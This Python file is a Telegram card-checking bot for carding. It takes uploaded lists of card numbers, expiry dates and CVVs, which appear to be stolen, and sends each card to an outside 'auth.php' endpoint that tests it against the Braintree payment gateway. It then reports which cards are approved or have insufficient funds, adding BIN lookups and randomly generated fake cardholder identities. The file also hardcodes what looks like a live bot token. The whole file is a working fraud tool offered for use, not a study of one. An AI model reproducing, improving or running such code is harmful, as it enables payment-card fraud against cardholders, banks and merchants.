import os
import string
import random
import requests
import telebot
import json
import time
import json
import random

names = ['ahmed', 'noofa', 'nisan', 'sara', 'lusi', 'andro', 'mia', 'Emily', 'Eric', 'nik', 'tito', 'anor', 'angel']
street_numbers = [100, 200, 300, 400]
street_names = ['Main St.', 'First St.', 'Second St.', 'Third St.']
cities = ['New York', 'Los Angeles', 'Chicago', 'Houston']
states = ['NY', 'CA', 'IL', 'TX']
postal_codes = ['10001', '90001', '60601', '77001', '10080']

name = random.choice(names)
last = random.choice(['4y hany', 'basem', 'mohamed', 'wanda', 'mix', 'qaser', 'gohn', 'winder', 'polo', 'salah'])
email = f"{name.lower()}.{last.lower()}@gmail.com"  
address_number = random.choice(street_numbers)
address_name = random.choice(street_names)
city = random.choice(cities)
state = random.choice(states)
postal_code = random.choice(postal_codes)
address = f"{address_number} {address_name}, {city}, {state} {postal_code}"
country_code = random.choice(["US", "CA", "MX", "JP"]) 


data = {'name': {'first': name, 'last': last},
        'email': email,
        'location': {'street': {'number': address_number, 'name': address_name},
                     'city': city,
                     'state': state,
                     'postcode': postal_code}}


lookup_binlist_api_url = "https://lookup.binlist.net/"

bot_token = "6531211654:AAHUZ6UT7zJbPjZbxl5yV9H4H7YyL232eKY" #token
bot = telebot.TeleBot(bot_token)
print("RUN")
session = requests.Session()

is_card_checking = False
working_cards = []
workin_cards = []
worki_cards = []

def is_user_allowed(user_id):
    
    allowed_user_id = 5579729798 #id
    return user_id == allowed_user_id

def get_country_flag(country_code):

    country_code = country_code.upper()
    flag_offset = 0x1F1E6

    country_code_a_offset = ord(country_code[0]) - 65
    country_code_b_offset = ord(country_code[1]) - 65
    return chr(flag_offset + country_code_a_offset) + chr(flag_offset + country_code_b_offset)

def lookup_bin_cc(cc):

    headers = {"Accept-Version": "3", "Accept": "application/json"}
    response = requests.get(lookup_binlist_api_url + cc, headers=headers)

    if response.status_code == 200:
        return json.loads(response.text)
    else:
        return None


@bot.message_handler(commands=['start'])
def handle_check_command(message):
    if not is_user_allowed(message.from_user.id):
        bot.reply_to(message, " 𝗻𝗼𝘁 𝗳𝗿𝗲𝗲 ")
        return

    text = " 𝘀𝗲𝗻𝗱 𝗰𝗼𝗺𝗯𝗼 𝗰𝗰 🥹🫶 "
    bot.send_message(chat_id=message.chat.id, text=text)

    global is_card_checking
    is_card_checking = True


@bot.message_handler(content_types=['document'])
def handle_card_file(message):
    try:
        file_id = message.document.file_id
        file_info = bot.get_file(file_id)
        file_path = file_info.file_path

        cards = []

        downloaded_file = bot.download_file(file_path)

        file_content = downloaded_file.decode('utf-8')
        card_lines = file_content.strip().split('\n')

        for line in card_lines:
            card_data = line.strip().split('|')

            if len(card_data) != 4:
                bot.reply_to(message, f"fuck cc: {line}")
                continue

            cc, mes, ano, cvv = map(str.strip, card_data)
            cards.append((cc, mes, ano, cvv))

        check_cards_from_file(message, cards)

    except Exception as e:
        bot.reply_to(message, "wait")
        print(str(e))


def check_cards_from_file(message, cards):
    try:
        not_working_cards = []
        insufficient_funds = []
        cards_3D_secure = []

        text = "wait "
        msg = bot.send_message(chat_id=message.from_user.id,text=text)

        for cc, mes, ano, cvv in cards:
            if not is_card_checking:
                break

            msg_text = "None"
            card = f"{cc}|{mes}|{ano}|{cvv}"
            lookup_bin_result = lookup_bin_cc(cc[:6])
            if lookup_bin_result is not None:
                bank_name = lookup_bin_result.get("bank", {}).get("name", "𝘂𝗻𝗸𝗻𝗼𝘄𝗻")
                country_code = lookup_bin_result.get("country", {}).get("alpha2", None)
                brand_name = lookup_bin_result.get("brand", "𝘂𝗻𝗸𝗻𝗼𝘄𝗻")
                card_type = lookup_bin_result.get("type", "𝘂𝗻𝗸𝗻𝗼𝘄𝗻")
                emoji = ''
                if country_code is not None:
                    emoji = get_country_flag(country_code)
                if brand_name != "N/A":
                    emoji += f" ({brand_name})"
            else:

                bank_name = "𝘂𝗻𝗸𝗻𝗼𝘄𝗻"
                country_name = "𝘂𝗻𝗸𝗻𝗼𝘄𝗻"
                brand_name = "𝘂𝗻𝗸𝗻𝗼𝘄𝗻"
                card_type = "𝘂𝗻𝗸𝗻𝗼𝘄𝗻"
                emoji = ''
                
            url = f"https://authga.replit.app/auth.php?lista={card}" #host
            response = session.post(url)

            if "Approved" in response.text:
                working_cards.append(card)
                bot.send_message(chat_id=message.from_user.id,text=f"Braintree Auth\n"
f"━━━━━━━━━━━━━━\n"
f"Card ↯ {card}\n"
f"Status ↯ Approved! ✅\n"
f"Message ↯ Approved\n"
f"━━━━━━━━━━━━━━\n"
f"Bank ↯ {bank_name}\n"
f"Brand ↯ {brand_name}\n"
f"Country ↯ {country_name} {emoji}\n"
f"━━━━━━━━━━━━━━\n"
f"\n"
f"Devloper ↯ B3 ᴹ 🇮🇳\n")
                msg_text = "approved"
            elif "approved" in response.text:
                working_cards.append(card)
                bot.send_message(chat_id=message.from_user.id,text=f"Braintree Auth\n"
f"━━━━━━━━━━━━━━\n"
f"Card ↯ {card}\n"
f"Status ↯ Approved! ✅\n"
f"Message ↯ Approved\n"
f"━━━━━━━━━━━━━━\n"
f"Bank ↯ {bank_name}\n"
f"Brand ↯ {brand_name}\n"
f"Country ↯ {country_name} {emoji}\n"
f"━━━━━━━━━━━━━━\n"
f"\n"
f"Devloper ↯ B3 ᴹ 🇮🇳\n")
                msg_text = "non"
            elif "insufficient" in response.text:
                workin_cards.append(card)
                bot.send_message(chat_id=message.from_user.id,text=f"Braintree Auth\n"
f"━━━━━━━━━━━━━━\n"
f"Card ↯ {card}\n"
f"Status ↯ Approved! ✅\n"
f"Message ↯ Approved\n"
f"━━━━━━━━━━━━━━\n"
f"Bank ↯ {bank_name}\n"
f"Brand ↯ {brand_name}\n"
f"Country ↯ {country_name} {emoji}\n"
f"━━━━━━━━━━━━━━\n"
f"\n"
f"Devloper ↯ B3 ᴹ 🇮🇳\n")
                msg_text = "funds."
            elif "Your card s security code " in response.text:
                worki_cards.append(card)
                bot.send_message(chat_id=message.from_user.id,text=f"🏃𝗰𝗰 : {card}  🫴\n"
											        f"𝘀𝘁𝗮𝘁𝘂𝘀 :- New payment Card ✅\n"
											        f"━━━━━━━━━━━━━━━\n"
											        f"𝗴𝗮𝘁𝗲𝘄𝗮𝘆 :- b3 ✨⛈\n"
											        f"━━━━━━━━━━━━━━\n"
											        f"𝗿𝗲𝘀𝗽𝗼𝗻𝘀𝗲 :- ccn! ✨⛈⁩\n"
											        f"━━━━━━━━━━━━━\n"
											        f"𝗻𝗮𝗺𝗲 :- {name}✨⛈\n"
											        f"𝗹𝗮𝘀𝘁 𝗻𝗮𝗺𝗲 :- {last}✨⛈\n"
											        f"𝗲𝗺𝗮𝗶𝗹 :- {email}✨⛈\n"
											        f"𝗮𝗱𝗱𝗿𝗲𝘀𝘀 :- {address}✨⛈\n"
											        f"━━━━━━━━━━━━\n"
											        f"𝗯𝗮𝗻𝗸 :- {bank_name}✨⛈\n"
											        f"𝗯𝗿𝗮𝗻𝗱 :- {brand_name}✨⛈\n"
											        f"𝗰𝗼𝘂𝗻𝘁𝗿𝘆 :- {country_code} {emoji}✨⛈\n"
								 			       f"━━━━━━━━━━━━━━━\n"
											        f"𝗯𝘆 :- @Raven_Ccs ✨⛈\n")
                msg_text = "n"
            elif "kk" in response.text:
                worki_cards.append(card)
                bot.send_message(chat_id=message.from_user.id,text=f"🏃𝗰𝗰 : {card}  🫴\n"
											        f"𝘀𝘁𝗮𝘁𝘂𝘀 :- New payment Card ✅\n"
											        f"━━━━━━━━━━━━━━━\n"
											        f"𝗴𝗮𝘁𝗲𝘄𝗮𝘆 :- b3 ✨⛈\n"
											        f"━━━━━━━━━━━━━━\n"
											        f"𝗿𝗲𝘀𝗽𝗼𝗻𝘀𝗲 :- ccn! ✨⛈⁩\n"
											        f"━━━━━━━━━━━━━\n"
											        f"𝗯𝗮𝗻𝗸 :- {bank_name}✨⛈\n"
											        f"𝗯𝗿𝗮𝗻𝗱 :- {brand_name}✨⛈\n"
											        f"𝗰𝗼𝘂𝗻𝘁𝗿𝘆 :- {country_code} {emoji}✨⛈\n"
								 			       f"━━━━━━━━━━━━━━━\n"
											        f"𝗯𝘆 :- @Raven_Ccs ✨⛈\n")
                msg_text = "Your card number "
            else:
                not_working_cards.append(card)
                msg_text = ""

            reply_markup = create_reply_markup(card, len(not_working_cards), len(working_cards), len(workin_cards), len(worki_cards), msg_text)
            try:
                bot.edit_message_text(
                    chat_id=message.chat.id,
                    message_id=msg.message_id,
                    text="Wait",
                    reply_markup=reply_markup
                )
            except telebot.apihelper.ApiTelegramException:
                import time
                time.sleep(20)
    except Exception as e:
        bot.reply_to(message, "fuck tell @Raven_Ccs")
        print(str(e))

def create_reply_markup(current_card, num_not_working, num_working, num_workin, num_worki,  message_text):
    markup = telebot.types.InlineKeyboardMarkup()

    current_card_button = telebot.types.InlineKeyboardButton(text=f"• {current_card} •", callback_data="current_card")

    working_button = telebot.types.InlineKeyboardButton(text=f"𝗮𝗽𝗿𝗼𝘃𝗲𝗱 ✅ : {num_working}", callback_data="working")

    message_button = telebot.types.InlineKeyboardButton(text=message_text, callback_data="message")

    workin_button = telebot.types.InlineKeyboardButton(text=f"𝗶𝗻𝘀𝘂𝗳𝗳𝗶𝗰𝗶𝗲𝗻𝘁 🫴 : {num_workin}", callback_data="workin")

    worki_button = telebot.types.InlineKeyboardButton(text=f"𝗿𝗶𝘀𝗸 😮‍💨 : {num_worki}", callback_data="worki")

    not_working_button = telebot.types.InlineKeyboardButton(text=f"𝗱𝗲𝗰𝗹𝗶𝗻𝗲𝗱 ❌ : {num_not_working}", callback_data="not_working")

    stop_button = telebot.types.InlineKeyboardButton(text="𝘀𝘁𝗼𝗽 メ", callback_data="stop")

    markup.row(current_card_button)
    markup.row(message_button)
    markup.row(working_button)
    markup.row(workin_button)
    markup.row(worki_button)
    markup.row(not_working_button)
    markup.row(stop_button)

    return markup

@bot.callback_query_handler(func=lambda call: True)
def handle_callback_query(call):
    if call.data == "stop":
        global is_card_checking
        is_card_checking = False
        bot.answer_callback_query(call.id, text="𝗰𝗮𝗿𝗱 𝗰𝗵𝗲𝗰𝗸𝗶𝗻𝗴 𝗽𝗿𝗼𝗰𝗲𝘀𝘀 𝘀𝘁𝗼𝗽𝗽𝗲𝗱 😮 ‍💨️")
        
time.sleep(20)#This is because I do not have a proxy. You can control the speed of the chk. I do it in 25 seconds

bot.polling()